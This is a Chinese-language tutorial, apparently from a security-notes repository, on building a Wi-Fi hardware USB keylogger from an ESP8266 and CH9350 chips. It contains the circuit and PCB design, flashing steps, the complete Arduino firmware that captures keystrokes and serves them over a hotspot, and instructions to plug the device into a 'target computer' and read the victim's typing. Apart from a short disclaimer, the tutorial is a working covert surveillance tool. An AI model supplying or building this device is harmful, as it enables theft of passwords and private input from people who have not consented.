# HID-USBKeyLogger

> 本部分内容最初由 [Sarah-Briggs](https://github.com/Sarah-Briggs) 和 [Atomic-Crash](https://github.com/Atomic-Crash) 提供,在此只做排版修改,和后续内容维护

> 注 : 笔记中源代码和相应库在其图片目录下

<p align="center">
    <img src="../../../../../assets/img/banner/HID-USBKeyLogger.jpg">
</p>

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**文章/教程**
- [手把手教你DIY一个硬件键盘记录器](https://www.freebuf.com/geek/241398.html)
- [50元制作PS2键盘无线监控装置 ](https://www.freebuf.com/geek/58895.html)

**资源**
- [spacehuhn/wifi_keylogger](https://github.com/spacehuhn/wifi_keylogger)

---

# 简介

硬件键盘记录器在国内外的电商上有很多成品，但是价格略贵，那么本次参考 freebuf 上教程自己制作一个。

既然要做成无线版的，较为靠谱的就是在原硬件上加焊 wifi 芯片，使攻击者可以在以其为中心的 WiFi 覆盖范围内获取信息。

主要思路就是做一个基于 ESP8266+CH9350 的键盘记录器，且带有 Wi-Fi 功能，可以存储记录到的键盘输入，并可以通过其发出的 Wi-Fi 网络，在手机端查看记录到的用户键入数据。

---

# 制作过程

## WiFi模块

WiFi 部分，选用 ESP8266 芯片，廉价而且功能强大的 SOC(系统级芯片)，广泛应用与物联网领域。这里使用了 ESP8266-07S 模块，体积非常小，而且引出了常用的引脚，满足于该设计的需要。

ESP8266 芯片使用了 3.3V 的直流电源，体积小，功耗低，支持透传，丢包率较低，重点是便宜。

相应的还有 ESP8266-02，03 等等，它们使用的核心芯片都是相同的，唯一不同就是引出的引脚不同，而且有的系列对核心芯片还加了金属屏蔽壳，有的可外接陶瓷天线等。

ESP-07 则是带外置天线的，就算使用环境有信号屏蔽，也还有一定改善的余地。

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/4.jpg)

---

## 键盘记录部分

这里采用 CH9350 芯片，用于将 HID 协议转换为 UART 协议，以便分析记录键盘数据。后端的数据分析和记录在 ESP8266 上实现。

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/5.jpg)

CH9350 是一款 USB 键鼠转串口通讯控制芯片，它可以将 HID 协议和 UART() 协议互相转换，而且完成度很高，性价比十足。

---

## 整体电路设计

我们要使用 CH9350 将 USB 键盘的 HID 协议转为 UART 协议，使用 ESP8266 解析和记录键盘输入内容，并且提供 WI-FI 访问功能，电路图和 PCB 图如下：

- https://lceda.cn/editor#id=1c71835d278545a79ea0c36eabb426a3
- https://lceda.cn/editor#id=bc6800ad5bce4ea4b76987282ac3377f

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/6.png)

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/7.png)

- 左下角是电源模块，前面固件选用时提到过，WiFi 芯片 ESP8266 是使用的 3.3V 供电，USB 接口都是 5V 的供电输入，强行直连会导致电大过大从而引起升温甚至烧毁。因此本设计需要采用 AMS1117-3.3 芯片进行降压处理。
- 正下方是 ESP8266-07S 模块，我们使用它的通用异步收发传输接口-RXD(接收端)来接收上面两片 CH9350 芯片发出的数据。它连接到键盘端 CH9350 的 UART 的 TX(发送端)，旁听这两片 CH9350 之间的通讯内容。这样排布的一个好处就是：键盘记录器的分析模块站在了“旁观者”的角度，即使它出现了解析速度慢，甚至宕机的情况，也不会对键盘产生任何影响(就算卡也卡不到受害者)。
- 正中央的两颗芯片是 CH9350。根据官方使用手册，使用两颗 CH9350 分别作为**连接键盘的下位机和连接电脑的上位机**，统一使用 3.3V 降压模块进行供电。
- 两侧是 USB 接头和母座，用于插入电脑的 USB 接口，和连接 USB 键盘。(这两个有实物图，上面提及的芯片在"研发时期"不幸烧毁，没得看了)

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/8.jpg)

---

## 固件部分

具体的键盘数据解析、数据存储、Wi-Fi 功能，是需要我们编写相关程序的，再烧录进 ESP8266 固件中，最后在底板上进行模块化拼接后使用。

ESP8266 支持通过 Arduino 开发，这为我们的固件开发提供了便利，因此本设计在 Arduino 环境下完成开发。

根据设计需求，ESP8266 的固件需要实现如下功能：
- 通过 UART 串口读取 CH9350 之间的键盘数据，并进行解析；
- 将数据储存进 SPIFSS 中，并提供读取和清空的功能；
- 提供通过 Wi-Fi 查看记录内容的功能。

通电后，两颗 CH9350 芯片会自动进入通信模式，在 UART 接口上传输多种数据帧。具体的过程和数据帧信息，可查阅官方文档。而其中我们需要的是**有效键值帧**，其包含用户在键盘上按下的按键信息。

其格式如下：

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/9.jpg)

截取到的是 USB 键盘的数据，帧格式一般是这样的：
```C
  57AB 83 0C 12 01 00 00 04 00 00 00 00 00 12 17   // A键被按下

  57AB 83 0C 12 01 00 00 00 00 00 00 00 00 13 14   // 按键被放开
```

前面 6 位都是固定的，后面的 8 位是标准的 USB 键盘数据，最后 2 位是序列号和校验。

前 6 位可以作为识别有效键值帧的特征(检测到这样的数值就可以确定是按键按下了)，接下来读取后 8 位即可得到击键信息。*具体的数据表可参考 USB HID Usage Table 手册*

本次使用的固件编译器是 Arduino ，一款便捷灵活、方便上手的开源电子原型平台。

Arduino IDE，就是在计算机中的程序开发环境。只要在 IDE 中编写程序代码，将程序上传到 Arduino 电路板后，程序便会告诉 Arduino 电路板要做些什么了。

Arduino 中，实现识别有效键值帧的示例代码如下：
```C
void loop() {
  while (Serial.available() > 0) {       // 串口缓冲区有数据
    if (Serial.read() == 0x83){          // 帧的第二位 83 是第一个特征
      delay(10);                         // 适当延迟，等待后续数据到达串口缓冲区
      if (Serial.read() == 0x0C){
        delay(10);
        if (Serial.read() == 0x12){
          delay(10);
          if (Serial.read() == 0x01){
          //此处读取8位键盘数据
          }
        }
      }
    }
  }
}
```

ESP8266 模块通过连接到上位机的 CH9350 的 TX 端口，接收键盘的数据帧。并将其解码为按键信息。接下来将获得的数据保存在 SPIFSS中。

SPIFSS(Serial Peripheral Interface Flash File System)是 ESP8266 模块自带的一个闪存，它的数据在断电后也不会丢失。

ESP8266-07S 模块中，这个闪存的大小为 4M，足够我们保存相当多的键盘记录了。*一个按键按下的记录信息大约要花32字节去存的话，4兆大约可以存按下键盘13万次的内容。*

最后是 WiFi 部分：创建一个 Wi-Fi 网络，攻击者连接上以后就可以查看或清空键盘记录。部分核心代码如下：
```C
#include <ESP8266WiFi.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>

const char *ssid = "USBKeyLogger";   // 创建的接入点的名称
const char *password = "12345678";   // 接入点的密码

AsyncWebServer server(80);           // 在 80 端口开启服务（ip 为 192.168.4.1）

void setup() {

  WiFi.mode(WIFI_STA);               // Wi-Fi为接入点模式
  WiFi.softAP(ssid,password);        // 开启Wi-Fi

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){         // 当访问根目录时显示记录内容
    request->send(SPIFFS, "/keyLog.txt", "text/plain");
  });

  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){    // 当访问“/claer”时清空已有记录(手机浏览器末尾写/clear即可清除先前的内容)
    logFile.close();
    logFile = SPIFFS.open("/keyLog.txt", "w");
    request->send(200, "text/plain", "Log File Cleared!");
  });
  server.begin();                                                      // 开启服务器
}
```

## 实物制作

为了更好的将电路集成，最好是将这些模块焊接在一块定制化的 PCB 电路板上(Printed Circuit Board，印制电路板，即电子元器件连接起来的支撑体)

现在大多数成熟的电子产品都是集成焊接在 PCB 板上的。因为 PCB 板可以更好的集成电子元件，使产品体积、结构上更优异，可以更稳定的运行。(手机，导航仪，电脑主板都是这样的)

推荐一个绘图工具：Altium designer
- 下载地址：https://www.altium.com.cn/ (好用，没广告，但是收费)

如果用普通的覆铜板也不是不可以，就是体积大，不美观。

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/16.jpg)

完成 PCB 设计后，将其工程文件导出为 Gerber 文件，提交给 PCB 生产厂商，即可投入生产,也可以直接在淘宝上搜"PCB定制"，把工程文件发给客服就可以定制了(本设计定制10片大约是200元)。

收到打印出来的成品后，如下：

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/17.jpg)

ESP8266 模块需要先烧录程序，再焊接到 PCB 上。否则要先断开 ESP8266 的 RX 触点和 PCB 的连接才可正常烧录，有些麻烦。烧录需要使用 USB2TTL 模块，淘宝买块 CH340 什么的就好，大概6块钱。

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/18.jpg)

烧录需要用到 Arduino IDE,点击“文件-首选项”，在“附加开发板管理器网址”中输入：
```
http://arduino.esp8266.com/stable/package_esp8266com_index.json
```

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/21.png)

保存后打开“工具-开发板-开发板管理器”，在“贡献”类型中找到“esp8266”，点击安装

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/22.png)

> 注:如果速度慢可以配置代理

可以在“工具-开发板”中找到“Generic ESP8266 Module”。选择它，并将其它设置（如Flash Size等）调整到如下图所示：

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/23.png)

具体的烧录的方法是，将 ESP8266 芯片的 TXD0、RXD0、VCC、GND、GPIO0 连接到 USB2TTL 上。

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/19.png)

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/10.jpg)

连接完成后，将 USB2TTL 插上电脑的 usb 端口。

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/11.jpg)

最后在端口菜单中，选择 USB2TTL 的 COM 口(除了 COM1，可能是 COM3、COM4)，然后点击“项目-上传”，将代码烧录到开发板上。

比较麻烦的部分是要安装 ESP8266 的扩展，而且有可能会头文件丢失

> 注:这里在 GitHub 上找到了 lib 文件终于能成功的在代码里 include 到,相应库放在图片目录下,解压放到 arduino 的 libraries

```C
#include <ESP8266WiFi.h>
#include <FS.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>

const char *ssid = "USBKeyLogger";
const char *password = "12345678";

AsyncWebServer server(80);
File logFile;

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  WiFi.softAP(ssid,password);
  SPIFFS.begin();
  logFile = SPIFFS.open("/keyLog.txt", "a+");

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/keyLog.txt", "text/plain");
  });

  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){
    logFile.close();
    logFile = SPIFFS.open("/keyLog.txt", "w");
    request->send(200, "text/plain", "Log File Cleared!");
  });

  server.begin();
}

void loop() {
  while (Serial.available() > 0) {
    //57 AB 83 0C 12 01 00 00 04 00 00 00 00 00 12 17
    if (Serial.read() == 0x83){
      delay(10);
      if (Serial.read() == 0x0C){
        delay(10);
        if (Serial.read() == 0x12){
          delay(10);
          if (Serial.read() == 0x01){
            delay(10);
            Serial.read();
            delay(10);
            Serial.read();
            delay(10);
            logFile.print(getKey(Serial.read()));
          }
        }
      }
    }
  }
}

String getKey(int serialData){
  if(serialData==0x00){return "";}
  if(serialData==0x04){return "A";}
  if(serialData==0x05){return "B";}
  if(serialData==0x06){return "C";}
  if(serialData==0x07){return "D";}
  if(serialData==0x08){return "E";}
  if(serialData==0x09){return "F";}
  if(serialData==0x0A){return "G";}
  if(serialData==0x0B){return "H";}
  if(serialData==0x0C){return "I";}
  if(serialData==0x0D){return "J";}
  if(serialData==0x0E){return "K";}
  if(serialData==0x0F){return "L";}
  if(serialData==0x10){return "M";}
  if(serialData==0x11){return "N";}
  if(serialData==0x12){return "O";}
  if(serialData==0x13){return "P";}
  if(serialData==0x14){return "Q";}
  if(serialData==0x15){return "R";}
  if(serialData==0x16){return "S";}
  if(serialData==0x17){return "T";}
  if(serialData==0x18){return "U";}
  if(serialData==0x19){return "V";}
  if(serialData==0x1A){return "W";}
  if(serialData==0x1B){return "X";}
  if(serialData==0x1C){return "Y";}
  if(serialData==0x1D){return "Z";}
  if(serialData==0x1E){return "[1 or !]";}
  if(serialData==0x1F){return "[2 or @]";}
  if(serialData==0x20){return "[3 or #]";}
  if(serialData==0x21){return "[4 or $]";}
  if(serialData==0x22){return "[5 or %]";}
  if(serialData==0x23){return "[6 or ^]";}
  if(serialData==0x24){return "[7 or &]";}
  if(serialData==0x25){return "[8 or *]";}
  if(serialData==0x26){return "[9 or (]";}
  if(serialData==0x27){return "[10 or )]";}
  if(serialData==0x28){return "[ENTER]";}
  if(serialData==0x29){return "[ESC]";}
  if(serialData==0x2A){return "[BACKSPACE]";}
  if(serialData==0x2B){return "[TAB]";}
  if(serialData==0x2C){return "[SPACE]";}
  if(serialData==0x2D){return "[- or _]";}
  if(serialData==0x2E){return "[= or +]";}
  if(serialData==0x2F){return "[[ or {]";}
  if(serialData==0x30){return "[] or }]";}
  if(serialData==0x31){return "[\\ or |]";}
  if(serialData==0x32){return "[` or ~]";}
  if(serialData==0x33){return "[; or :]";}
  if(serialData==0x34){return "[' or ”]";}
  if(serialData==0x35){return "[~ or `]";}
  if(serialData==0x36){return "[, or <]";}
  if(serialData==0x37){return "[. or >]";}
  if(serialData==0x38){return "[/ or ?]";}
  if(serialData==0x39){return "[CAPS]";}
  if(serialData==0x3A){return "[F1]";}
  if(serialData==0x3B){return "[F2]";}
  if(serialData==0x3C){return "[F3]";}
  if(serialData==0x3D){return "[F4]";}
  if(serialData==0x3E){return "[F5]";}
  if(serialData==0x3F){return "[F6]";}
  if(serialData==0x40){return "[F7]";}
  if(serialData==0x41){return "[F8]";}
  if(serialData==0x42){return "[F9]";}
  if(serialData==0x43){return "[F10]";}
  if(serialData==0x44){return "[F11]";}
  if(serialData==0x45){return "[F12]";}
  if(serialData==0x46){return "[PRT_SCR]";}
  if(serialData==0x47){return "[SCOLL_LOCK]";}
  if(serialData==0x48){return "[PAUSE]";}
  if(serialData==0x49){return "[INS]";}
  if(serialData==0x4A){return "[HOME]";}
  if(serialData==0x4B){return "[PAGEUP]";}
  if(serialData==0x4C){return "[DEL]";}
  if(serialData==0x4D){return "[END]";}
  if(serialData==0x4E){return "[PAGEDOWN]";}
  if(serialData==0x4F){return "[RIGHT_ARROW]";}
  if(serialData==0x50){return "[LEFT_ARROW]";}
  if(serialData==0x51){return "[DOWN_ARROW]";}
  if(serialData==0x52){return "[UP_ARROW]";}
  if(serialData==0x53){return "[PAD_NUMLOCK]";}
  if(serialData==0x54){return "[PAD_DIV]";}
  if(serialData==0x55){return "[PAD_MUL]";}
  if(serialData==0x56){return "[PAD_SUB]";}
  if(serialData==0x57){return "[PAD_ADD]";}
  if(serialData==0x58){return "[PAD_ENTER]";}
  if(serialData==0x59){return "[PAD_1]";}
  if(serialData==0x5A){return "[PAD_2]";}
  if(serialData==0x5B){return "[PAD_3]";}
  if(serialData==0x5C){return "[PAD_4]";}
  if(serialData==0x5D){return "[PAD_5]";}
  if(serialData==0x5E){return "[PAD_6]";}
  if(serialData==0x5F){return "[PAD_7]";}
  if(serialData==0x60){return "[PAD_8]";}
  if(serialData==0x61){return "[PAD_9]";}
  if(serialData==0x62){return "[PAD_0]";}
  if(serialData==0x63){return "[PAD_DOT]";}
  if(serialData==0xE0){return "[leftctrl]";}
  if(serialData==0xE2){return "[leftAlt]";}
  if(serialData==0xE1){return "[leftShift]";}
  if(serialData==0xE3){return "[leftwindows]";}
  if(serialData==0xE7){return "[rightwindows]";}
  if(serialData==0xE5){return "[rightShift]";}
  if(serialData==0xE6){return "[rightAlt]";}
  if(serialData==0xE4){return "[rightCtrl]";}
}
```

这个过程需要 2-3 分钟，如果看到了如下返回信息，说明固件已经烧录成功。

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/24.png)

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/24-2.png)

接下来是板上元器件的焊接，相关的物料清单如下：

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/25.png)

焊接的顺序最好是 CH9350-AMS1111-电容-USB 插接件-ESP8266 模块。**ESP8266 一定要先烧录**

焊接完成后的成品是这样的：  *可以视需求安装 ESP8266-07S 的天线，因为其自带的天线信号一般，距离不是很远*

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/26.jpg)

---

# 使用

将无线键盘记录器插入到目标电脑,键盘插入无线键盘记录器

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/28.jpg)

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/27.jpg)

通电后,手机搜索 wifi,找到相应 wifi,连接,访问对应 url

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/31.jpg)

尝试输入 hello,world 可以发现,网页上已经成功读取

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/30.jpg)

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/29.jpg)

访问 /clear,清空

![](../../../../../assets/img/Security/IOT/硬件安全/HID/HID-USBKeyLogger/32.jpg)

成功清空
